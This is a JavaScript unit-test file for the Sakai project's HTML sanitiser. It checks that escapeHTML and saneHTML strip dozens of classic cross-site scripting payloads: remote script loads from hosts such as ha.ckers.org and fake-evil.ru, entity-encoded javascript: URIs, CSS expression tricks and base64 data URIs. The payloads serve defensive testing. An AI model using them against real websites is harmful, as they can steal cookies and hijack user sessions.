module("Security");

(function(){

/*
 * Test the escape HTML function
 */

test("Escape HTML", function(){

    var htmlString = "<a href='http://www.google.com'>Advertising my script enabled site with redirect</a>";
    var escapedExpected = "&lt;a href='http://www.google.com'&gt;Advertising my script enabled site with redirect&lt;/a&gt;";

    htmlString = sakai.api.Security.escapeHTML(htmlString);
    equals(htmlString, escapedExpected, "The escaped string is correct");

});

/*
 * Basic XSS cases
 */
test("Script Attacks", function() {
    expect(8);

    var htmlString = "test<script>alert(document.cookie)</script>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("script"), -1, "Strip script tag");

    htmlString = "<<<><<script src=http://fake-evil.ru/test.js>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("script"), -1, "Strip script tag");

    htmlString = "<script<script src=http://fake-evil.ru/test.js>>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("script"), -1, "Strip script tag");

    htmlString = "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("script"), -1, "Strip script tag");

    htmlString = "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("onload"), -1, "Strip onload");

    htmlString = "<BODY ONLOAD=alert('XSS')>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("alert"), -1, "Strip alert");

    htmlString = "<iframe src=http://ha.ckers.org/scriptlet.html <";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<iframe"), -1, "Strip iframe tag");

    htmlString = "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("src"), -1, "Strip src from input");
});

test("Image Attacks", function() {
    expect(10);

    var htmlString = "<img src=\"http://www.myspace.com/img.gif\"/>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<img"), 0, "Don't break images");

    htmlString = "<img src=javascript:alert(document.cookie)>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<img"), -1, "Strip images with js src");

    htmlString = "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<img"), -1, "Strip images with js src");

    htmlString = "<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<img"), -1, "Strip images with js src");

    htmlString = "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("alert"), -1, "Strip images with js src");

    htmlString = "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("&amp;"), 9, "Strip images with js src");

    htmlString = "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");

    htmlString = "<IMG SRC=\"javascript:alert('XSS')\"";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");

    htmlString = "<IMG LOWSRC=\"javascript:alert('XSS')\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");

    htmlString = "<BGSOUND SRC=\"javascript:alert('XSS');\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip images with js src");
});

test("href Attacks", function() {
    expect(33);

    var htmlString = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("href"), -1, "Strip javascript hrefs");

    htmlString = "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("href"), -1, "Strip javascript hrefs");

    htmlString = "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("ha.ckers.org"), -1, "Strip javascript hrefs");

    htmlString = "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("ha.ckers.org"), -1, "Strip javascript hrefs");

    htmlString = "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

    htmlString = "<IMG SRC='vbscript:msgbox(\"XSS\")'>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("vbscript"), -1, "Strip javascript hrefs");

    htmlString = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<meta"), -1, "Strip javascript hrefs");

    htmlString = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<meta"), -1, "Strip javascript hrefs");

    htmlString = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<meta"), -1, "Strip javascript hrefs");

    htmlString = "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("iframe"), -1, "Strip javascript hrefs");

    htmlString = "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

    htmlString = "<TABLE BACKGROUND=\"javascript:alert('XSS')\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("background"), -1, "Strip javascript hrefs");

    htmlString = "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("background"), -1, "Strip javascript hrefs");

    htmlString = "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

    htmlString = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("alert"), -1, "Strip javascript hrefs");

    htmlString = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("alert"), -1, "Strip javascript hrefs");

    htmlString = "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("ript:alert"), -1, "Strip javascript hrefs");

    htmlString = "<BASE HREF=\"javascript:alert('XSS');//\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

    htmlString = "<BaSe hReF=\"http://arbitrary.com/\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<base"), -1, "Strip javascript hrefs");

    htmlString = "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<object"), -1, "Strip javascript hrefs");

    htmlString = "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

    htmlString = "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<embed"), -1, "Strip javascript hrefs");

    htmlString = "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<embed"), -1, "Strip javascript hrefs");

    htmlString = "<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

    htmlString = "<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

    htmlString = "<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

    htmlString = "<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

    htmlString = "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("script"), -1, "Strip javascript hrefs");

    htmlString = "<SCRIPT SRC=http://ha.ckers.org/xss.js";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("<script"), -1, "Strip javascript hrefs");

    htmlString = "<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("style"), -1, "Strip javascript hrefs");

    htmlString = "<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("aim.exe"), -1, "Strip javascript hrefs");

    htmlString = "<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("javascript"), -1, "Strip javascript hrefs");

    htmlString = "<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("document"), -1, "Strip javascript hrefs");
});

test("CSS Attacks", function() {
    expect(4);

    var htmlString = "<div style=\"position:absolute\">";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("position"), -1, "Strip CSS positioning");

    var htmlString = "<style>b { position:absolute }</style>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("position"), -1, "Strip CSS positioning");

    var htmlString = "<div style=\"z-index:25\">test</div>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("z-index"), -1, "Strip CSS positioning");

    var htmlString = "<style>z-index:25</style>";
    htmlString = sakai.api.Security.saneHTML(htmlString);
    equals(htmlString.indexOf("z-index"), -1, "Strip CSS positioning");
});

})();
